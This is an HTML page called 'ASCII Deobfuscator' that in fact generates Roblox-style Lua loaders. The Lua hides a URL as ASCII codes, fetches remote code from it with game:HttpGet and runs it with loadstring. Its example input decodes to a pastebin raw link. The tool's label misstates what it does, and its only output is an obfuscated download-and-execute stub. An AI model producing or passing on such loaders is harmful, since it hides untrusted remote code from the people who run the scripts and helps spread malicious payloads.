<!DOCTYPE html>
<html>
<head>
    <title>ASCII Deobfuscator</title>
    <script>
        function deobfuscate() {
            let asciiInput = document.getElementById('asciiInput').value;
            let asciiValues = asciiInput.split(',').map(Number);
            let result = '';
            for (let i = 0; i < asciiValues.length; i++) {
                result += String.fromCharCode(asciiValues[i]);
            }

            let luaScript = `
local function executeScript()
    local asciiValues = {${asciiInput}}
    local function asciiToString(asciiTable)
        local str = ""
        for _, v in ipairs(asciiTable) do
            str = str .. string.char(v)
        end
        return str
    end
    local url = asciiToString(asciiValues)
    local code = game:HttpGet(url)
    local func = loadstring(code)
    func()
end

executeScript()
            `;

            document.getElementById('output').innerText = luaScript;
        }
    </script>
</head>
<body>
    <h1>ASCII Deobfuscator</h1>
    <p>Enter ASCII values separated by commas:</p>
    <input type="text" id="asciiInput" placeholder="e.g. 104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,82,83,98,97,80,48,55,116">
    <button onclick="deobfuscate()">Deobfuscate</button>
    <pre id="output"></pre>
</body>
</html>
